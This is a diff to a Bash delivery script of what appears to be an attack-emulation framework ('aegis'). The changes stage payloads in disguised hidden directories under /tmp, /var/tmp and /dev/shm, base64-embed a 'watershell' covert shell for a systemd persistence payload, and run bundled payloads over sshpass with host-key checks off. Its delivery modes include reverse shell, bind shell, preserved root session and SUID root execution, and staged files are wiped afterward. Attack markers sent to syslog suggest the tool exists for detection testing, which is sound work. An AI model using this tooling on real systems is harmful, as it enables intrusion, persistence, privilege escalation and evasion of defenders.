@@ -45,6 +45,21 @@ shell_quote() {
     printf "%q" "$1"
 }
 
+is_safe_remote_run_dir() {
+    local path="$1"
+
+    case "$path" in
+    /tmp/aegis_* | /var/tmp/aegis_* | /dev/shm/aegis_* | \
+        /tmp/.cache/aegis_* | /tmp/.config/aegis_* | \
+        /var/tmp/.system/aegis_* | /dev/shm/.runtime/aegis_*)
+        return 0
+        ;;
+    *)
+        return 1
+        ;;
+    esac
+}
+
 emit_embedded_template_pool() {
     local template_name="$1"
     local template_file="$2"
@@ -120,6 +135,23 @@ pick_template() {
 EOF
 }
 
+emit_payload_embedded_assets() {
+    case "$PAYLOAD_NAME" in
+    persistence_tasks/systemd_watershell)
+        local watershell_source="$FRAMEWORK_ROOT/payloads/shared/watershell.c"
+        local watershell_header="$FRAMEWORK_ROOT/payloads/shared/watershell.h"
+
+        [[ -f "$watershell_source" ]] ||
+            fail "Missing shared Watershell source: $watershell_source"
+        [[ -f "$watershell_header" ]] ||
+            fail "Missing shared Watershell header: $watershell_header"
+
+        printf 'WATERSHELL_SOURCE_B64='\''%s'\''\n' "$(base64 "$watershell_source" | tr -d '\n')"
+        printf 'WATERSHELL_HEADER_B64='\''%s'\''\n' "$(base64 "$watershell_header" | tr -d '\n')"
+        ;;
+    esac
+}
+
 # Delivery-layer cleanup tracks artifacts created by delivery mechanisms,
 # not artifacts created by the payload behavior itself.
 #
@@ -160,19 +192,26 @@ delivery_cleanup_enabled() {
 safe_remote_rm_file() {
     local target="$1"
     local path="$2"
+    local rm_command="rm -f --"
 
     [[ -n "$path" ]] || return 0
 
+    if is_safe_remote_run_dir "$path"; then
+        rm_command="rm -rf --"
+    fi
+
     case "$path" in
-    /tmp/aegis_* | /var/tmp/aegis_* | /dev/shm/aegis_* | /tmp/* | /var/tmp/* | /dev/shm/*)
-        if [[ "${TYPE:-}" == "ssh_auth" || ( ( "${TYPE:-}" == "root_session" || "${TYPE:-}" == "suid_exec" ) && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ) ]]; then
+    /tmp/aegis_* | /var/tmp/aegis_* | /dev/shm/aegis_* | \
+        /tmp/.cache/aegis_* | /tmp/.config/aegis_* | \
+        /var/tmp/.system/aegis_* | /dev/shm/.runtime/aegis_*)
+        if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
             sshpass -p "$PASSWORD" \
                 ssh -o StrictHostKeyChecking=no \
                 -o UserKnownHostsFile=/dev/null \
-                "$USERNAME@$target" \
-                "rm -f -- '$path'" >/dev/null 2>&1 || true
+                "$USERNAME@${target#*@}" \
+                "$rm_command '$path'" >/dev/null 2>&1 || true
         else
-            ssh "$target" "rm -f -- '$path'" >/dev/null 2>&1 || true
+            ssh "$target" "$rm_command '$path'" >/dev/null 2>&1 || true
         fi
         ;;
     *)
@@ -213,7 +252,7 @@ ssh_remote_command() {
             ssh -o StrictHostKeyChecking=no \
             -o UserKnownHostsFile=/dev/null \
             -o LogLevel=ERROR \
-            "$USERNAME@$target" \
+            "$USERNAME@${target#*@}" \
             "$command"
     else
         ssh "$target" "$command"
@@ -230,11 +269,91 @@ scp_from_remote() {
             scp -o StrictHostKeyChecking=no \
             -o UserKnownHostsFile=/dev/null \
             -o LogLevel=ERROR \
-            "$USERNAME@$target:$remote_path" \
+            "$USERNAME@${target#*@}:$remote_path" \
             "$local_path"
     else
         scp "$target:$remote_path" "$local_path"
     fi
+}
+
+scp_to_remote() {
+    local local_path="$1"
+    local target="$2"
+    local remote_path="$3"
+
+    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+        sshpass -p "$PASSWORD" \
+            scp -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o LogLevel=ERROR \
+            "$local_path" \
+            "$USERNAME@${target#*@}:$remote_path"
+    else
+        scp "$local_path" "$target:$remote_path"
+    fi
+}
+
+emit_remote_stage_candidates() {
+    if [[ -n "${AEGIS_REMOTE_STAGE_DIR:-}" ]]; then
+        printf '%s\n' "$AEGIS_REMOTE_STAGE_DIR"
+    fi
+
+    local template_file="$FRAMEWORK_ROOT/templates/staging_dirs.txt"
+
+    if [[ -f "$template_file" ]]; then
+        grep -v '^[[:space:]]*$' "$template_file" |
+            grep -v '^[[:space:]]*#' |
+            shuf
+    fi
+
+    # Stable fallbacks in case all randomized hidden parents are unavailable.
+    printf '%s\n' /tmp /var/tmp /dev/shm
+}
+
+prepare_remote_staging() {
+    local candidate_base
+    local candidate_run_dir
+    local q_candidate_run_dir
+    local tried=""
+
+    if [[ -n "${AEGIS_REMOTE_RUN_DIR:-}" ]]; then
+        REMOTE_RUN_DIR="$AEGIS_REMOTE_RUN_DIR"
+        REMOTE_STAGE_BASE="${REMOTE_RUN_DIR%/aegis_${RUN_ID}}"
+
+        is_safe_remote_run_dir "$REMOTE_RUN_DIR" ||
+            fail "Refusing unsafe AEGIS_REMOTE_RUN_DIR: $REMOTE_RUN_DIR"
+
+        q_candidate_run_dir="$(shell_quote "$REMOTE_RUN_DIR")"
+        ssh_remote_command "$TARGET" "mkdir -p $q_candidate_run_dir && test -d $q_candidate_run_dir && test -w $q_candidate_run_dir" >/dev/null ||
+            fail "Unable to create or write remote run directory: $REMOTE_RUN_DIR"
+        return 0
+    fi
+
+    while IFS= read -r candidate_base; do
+        [[ -n "$candidate_base" ]] || continue
+
+        candidate_run_dir="${candidate_base%/}/aegis_${RUN_ID}"
+        is_safe_remote_run_dir "$candidate_run_dir" || continue
+
+        case "$tried" in
+            *"|$candidate_run_dir|"*)
+                continue
+                ;;
+        esac
+        tried="${tried}|${candidate_run_dir}|"
+
+        q_candidate_run_dir="$(shell_quote "$candidate_run_dir")"
+
+        if ssh_remote_command "$TARGET" "mkdir -p $q_candidate_run_dir && test -d $q_candidate_run_dir && test -w $q_candidate_run_dir" >/dev/null 2>&1; then
+            REMOTE_STAGE_BASE="${candidate_base%/}"
+            REMOTE_RUN_DIR="$candidate_run_dir"
+            return 0
+        fi
+
+        warn "Remote staging candidate is not writable, trying another: $candidate_run_dir"
+    done < <(emit_remote_stage_candidates)
+
+    fail "Unable to find writable remote staging directory for run: $RUN_ID"
 }
 
 send_delivery_marker() {
@@ -243,7 +362,7 @@ send_delivery_marker() {
 
     q_marker="$(shell_quote "$marker")"
 
-    if [[ ( "${TYPE:-}" == "root_session" || "${TYPE:-}" == "suid_exec" ) && -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
         ssh_remote_command "$TARGET" "logger -t aegis_attack_marker -- $q_marker" || {
             warn "Failed to send marker to target: $marker"
             return 1
@@ -354,6 +473,19 @@ record_metadata "privilege=$PRIVILEGE"
 record_metadata "started_at=$(date -Is)"
 record_metadata "delivery_cleanup_requested=${AEGIS_DELIVERY_CLEANUP:-${DELIVERY_CLEANUP:-true}}"
 
+REMOTE_STAGE_BASE=""
+REMOTE_RUN_DIR=""
+prepare_remote_staging
+REMOTE_METADATA_TXT="$REMOTE_RUN_DIR/metadata.txt"
+REMOTE_METADATA_JSON="$REMOTE_RUN_DIR/metadata.json"
+
+record_metadata "remote_stage_base=$REMOTE_STAGE_BASE"
+record_metadata "remote_run_dir=$REMOTE_RUN_DIR"
+record_metadata "remote_metadata_txt=$REMOTE_METADATA_TXT"
+record_metadata "remote_metadata_json=$REMOTE_METADATA_JSON"
+
+add_remote_delivery_cleanup_path "$REMOTE_RUN_DIR"
+
 START_MARKER="START run_id=$RUN_ID chain_id=$CHAIN_ID delivery=$DELIVERY_NAME payload=$PAYLOAD_NAME category=$CATEGORY privilege=$PRIVILEGE user=$(whoami)"
 
 MARKER_TARGET="$TARGET"
@@ -396,12 +528,13 @@ ssh)
         echo '# Remote metadata setup'
         echo "RUN_ID='$RUN_ID'"
         echo "CHAIN_ID='$CHAIN_ID'"
-        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
-        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         echo '# Payload config'
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         echo '# Payload body'
         sed \
@@ -413,32 +546,25 @@ ssh)
 
     chmod +x "$BUNDLE_SCRIPT"
 
-    ssh "$TARGET" "bash -s" \
+    ssh_remote_command "$TARGET" "bash -s" \
         <"$BUNDLE_SCRIPT" |
         tee "$RUN_DIR/scenario_output.log"
 
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
 
-    scp "$TARGET:$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
-    scp "$TARGET:$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
 
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
 
     ;;
 
 scp_then_ssh)
 
     RANDOM_UPLOAD_NAME="$(pick_template payload_names)"
-    RANDOM_DIR="$(pick_template staging_dirs)"
-    RANDOM_SUFFIX="$(random_string 6)"
 
-    REMOTE_PATH="${RANDOM_DIR}/${RANDOM_UPLOAD_NAME}-${RANDOM_SUFFIX}.sh"
+    REMOTE_PATH="${REMOTE_RUN_DIR}/${RANDOM_UPLOAD_NAME}.sh"
     BUNDLE_SCRIPT="$RUN_DIR/bundled_payload_scp.sh"
 
     record_metadata "remote_payload=$REMOTE_PATH"
-    add_remote_delivery_cleanup_path "$REMOTE_PATH"
 
     log "Building bundled payload for SCP delivery"
 
@@ -453,11 +579,12 @@ scp_then_ssh)
         echo "TARGET_USER='${TARGET_USER:-}'"
         echo "USERNAME='${USERNAME:-}'"
         echo "PASSWORD='${PASSWORD:-}'"
-        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
-        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         sed \
             -e '/FRAMEWORK_ROOT must be set/d' \
@@ -470,22 +597,21 @@ scp_then_ssh)
 
     log "Uploading bundled payload to $REMOTE_PATH"
 
-    ssh "$TARGET" "mkdir -p '$RANDOM_DIR'"
-    scp "$BUNDLE_SCRIPT" "$TARGET:$REMOTE_PATH"
+    q_remote_run_dir="$(shell_quote "$REMOTE_RUN_DIR")"
+    q_remote_path="$(shell_quote "$REMOTE_PATH")"
 
-    ssh "$TARGET" "
-        chmod +x '$REMOTE_PATH'
-        bash '$REMOTE_PATH'
+    ssh_remote_command "$TARGET" "mkdir -p $q_remote_run_dir"
+    scp_to_remote "$BUNDLE_SCRIPT" "$TARGET" "$REMOTE_PATH"
+
+    ssh_remote_command "$TARGET" "
+        chmod +x $q_remote_path
+        bash $q_remote_path
     " | tee "$RUN_DIR/scenario_output.log"
 
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
 
-    scp "$TARGET:$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
-    scp "$TARGET:$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
 
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
 
     ;;
 
@@ -504,11 +630,12 @@ reverse_shell)
         echo "TARGET_USER='${TARGET_USER:-}'"
         echo "USERNAME='${USERNAME:-}'"
         echo "PASSWORD='${PASSWORD:-}'"
-        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
-        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         sed \
             -e '/FRAMEWORK_ROOT must be set/d' \
@@ -526,14 +653,10 @@ reverse_shell)
         "$DELIVERY_CONF" \
         "$BUNDLE_SCRIPT"
 
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
 
-    scp "$TARGET:$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
-    scp "$TARGET:$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
 
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
 
     ;;
 
@@ -552,11 +675,12 @@ bind_shell)
         echo "TARGET_USER='${TARGET_USER:-}'"
         echo "USERNAME='${USERNAME:-}'"
         echo "PASSWORD='${PASSWORD:-}'"
-        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
-        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         sed \
             -e '/FRAMEWORK_ROOT must be set/d' \
@@ -574,14 +698,10 @@ bind_shell)
         "$DELIVERY_CONF" \
         "$BUNDLE_SCRIPT"
 
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
 
-    scp "$TARGET:$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
-    scp "$TARGET:$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
+    scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
 
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
 
     ;;
 
@@ -599,12 +719,13 @@ root_session)
     BUNDLE_SCRIPT="$RUN_DIR/bundled_payload_root_session.sh"
     SESSION_COMMANDS="$RUN_DIR/root_session_commands.sh"
     SESSION_MARKER="__AEGIS_ROOT_SESSION_DONE_${RUN_ID}__"
-    SESSION_PAYLOAD_PATH="/tmp/aegis_root_session_${RUN_ID}.sh"
+    SESSION_PAYLOAD_PATH="${REMOTE_RUN_DIR}/root_session_payload.sh"
 
     q_session_input="$(shell_quote "$SESSION_INPUT")"
     q_session_transcript="$(shell_quote "$SESSION_TRANSCRIPT")"
     q_session_payload_path="$(shell_quote "$SESSION_PAYLOAD_PATH")"
     q_session_marker="$(shell_quote "$SESSION_MARKER")"
+    q_remote_run_dir="$(shell_quote "$REMOTE_RUN_DIR")"
 
     log "Building bundled payload for preserved root shell session"
 
@@ -619,11 +740,12 @@ root_session)
         echo "TARGET_USER='${TARGET_USER:-}'"
         echo "USERNAME='${USERNAME:-}'"
         echo "PASSWORD='${PASSWORD:-}'"
-        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
-        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         sed \
             -e '/FRAMEWORK_ROOT must be set/d' \
@@ -635,6 +757,7 @@ root_session)
     chmod +x "$BUNDLE_SCRIPT"
 
     {
+        printf 'mkdir -p %s\n' "$q_remote_run_dir"
         printf 'cat > %s <<'\''__AEGIS_ROOT_SESSION_PAYLOAD_%s__'\''\n' \
             "$q_session_payload_path" "$RUN_ID"
         cat "$BUNDLE_SCRIPT"
@@ -682,24 +805,15 @@ root_session)
 
     record_metadata "root_session_status=$SESSION_STATUS"
 
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
 
     scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
     scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
 
-    q_remote_metadata_txt="$(shell_quote "$REMOTE_METADATA_TXT")"
-    q_remote_metadata_json="$(shell_quote "$REMOTE_METADATA_JSON")"
-
     {
-        printf 'rm -f -- %s %s\n' \
-            "$q_remote_metadata_txt" \
-            "$q_remote_metadata_json"
+        printf 'rm -rf -- %s\n' "$q_remote_run_dir"
     } | ssh_remote_command "$TARGET" "cat > $q_session_input" || \
         warn "Failed to remove root-session remote metadata through preserved shell"
 
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
 
     [[ "$SESSION_STATUS" == "0" ]] ||
         fail "Root session payload failed with status: $SESSION_STATUS"
@@ -716,11 +830,17 @@ suid_exec)
 
     BUNDLE_SCRIPT="$RUN_DIR/bundled_payload_suid_exec.sh"
     SETUID_WRAPPER="$RUN_DIR/suid_exec_setuid_wrapper.py"
-    REMOTE_STAGE_DIR="${REMOTE_STAGE_DIR:-/tmp}"
+    REMOTE_STAGE_DIR="${REMOTE_STAGE_DIR:-$REMOTE_RUN_DIR}"
+
+    if ! is_safe_remote_run_dir "$REMOTE_STAGE_DIR"; then
+        REMOTE_STAGE_DIR="${REMOTE_STAGE_DIR%/}/aegis_${RUN_ID}"
+    fi
+
     REMOTE_PAYLOAD_PATH="${REMOTE_STAGE_DIR%/}/aegis_suid_exec_${RUN_ID}.sh"
     REMOTE_SETUID_WRAPPER="${REMOTE_STAGE_DIR%/}/aegis_suid_exec_${RUN_ID}_setuid.py"
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
+
+    is_safe_remote_run_dir "$REMOTE_STAGE_DIR" ||
+        fail "Refusing unsafe REMOTE_STAGE_DIR: $REMOTE_STAGE_DIR"
 
     q_root_exec_path="$(shell_quote "$ROOT_EXEC_PATH")"
     q_root_exec_args="$(shell_quote "${ROOT_EXEC_ARGS:--p}")"
@@ -728,9 +848,6 @@ suid_exec)
     q_remote_stage_dir="$(shell_quote "$REMOTE_STAGE_DIR")"
     q_remote_payload_path="$(shell_quote "$REMOTE_PAYLOAD_PATH")"
     q_remote_setuid_wrapper="$(shell_quote "$REMOTE_SETUID_WRAPPER")"
-    q_remote_metadata_txt="$(shell_quote "$REMOTE_METADATA_TXT")"
-    q_remote_metadata_json="$(shell_quote "$REMOTE_METADATA_JSON")"
-
     log "Building bundled payload for SUID root execution"
 
     {
@@ -749,6 +866,7 @@ suid_exec)
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         sed \
             -e '/FRAMEWORK_ROOT must be set/d' \
@@ -802,10 +920,6 @@ PYEOF
         scp "$SETUID_WRAPPER" "$TARGET:$REMOTE_SETUID_WRAPPER"
     fi
 
-    add_remote_delivery_cleanup_path "$REMOTE_PAYLOAD_PATH"
-    add_remote_delivery_cleanup_path "$REMOTE_SETUID_WRAPPER"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_TXT"
-    add_remote_delivery_cleanup_path "$REMOTE_METADATA_JSON"
 
     log "Validating SUID root execution primitive"
 
@@ -853,7 +967,7 @@ PYEOF
     scp_from_remote "$TARGET" "$REMOTE_METADATA_TXT" "$RUN_DIR/remote_metadata.txt" >/dev/null 2>&1 || true
     scp_from_remote "$TARGET" "$REMOTE_METADATA_JSON" "$RUN_DIR/remote_metadata.json" >/dev/null 2>&1 || true
 
-    ssh_remote_command "$TARGET" "$SUID_ROOT_COMMAND -c 'rm -f -- $q_remote_payload_path $q_remote_setuid_wrapper $q_remote_metadata_txt $q_remote_metadata_json'" >/dev/null 2>&1 || true
+    ssh_remote_command "$TARGET" "$SUID_ROOT_COMMAND -c 'rm -rf -- $q_remote_stage_dir'" >/dev/null 2>&1 || true
 
     ;;
 
@@ -880,11 +994,12 @@ ssh_auth)
         echo "TARGET_USER='${TARGET_USER:-}'"
         echo "USERNAME='${USERNAME:-}'"
         echo "PASSWORD='${PASSWORD:-}'"
-        echo "METADATA_TXT='/tmp/aegis_${RUN_ID}_metadata.txt'"
-        echo "METADATA_JSON='/tmp/aegis_${RUN_ID}_metadata.json'"
+        echo "METADATA_TXT='$REMOTE_METADATA_TXT'"
+        echo "METADATA_JSON='$REMOTE_METADATA_JSON'"
         echo "init_metadata \"\$METADATA_TXT\" \"\$METADATA_JSON\""
         echo
         sed '/^#/d' "$PAYLOAD_CONF"
+        emit_payload_embedded_assets
         echo
         sed \
             -e '/FRAMEWORK_ROOT must be set/d' \
@@ -903,8 +1018,6 @@ ssh_auth)
         <"$BUNDLE_SCRIPT" |
         tee "$RUN_DIR/scenario_output.log"
 
-    REMOTE_METADATA_TXT="/tmp/aegis_${RUN_ID}_metadata.txt"
-    REMOTE_METADATA_JSON="/tmp/aegis_${RUN_ID}_metadata.json"
 
     sshpass -p "$PASSWORD" \
         scp -o StrictHostKeyChecking=no \
@@ -924,7 +1037,7 @@ ssh_auth)
         ssh -o StrictHostKeyChecking=no \
         -o UserKnownHostsFile=/dev/null \
         "$USERNAME@$TARGET" \
-        "rm -f '$REMOTE_METADATA_TXT' '$REMOTE_METADATA_JSON'" \
+        "rm -rf '$REMOTE_RUN_DIR'" \
         >/dev/null 2>&1 || true
 
     ;;
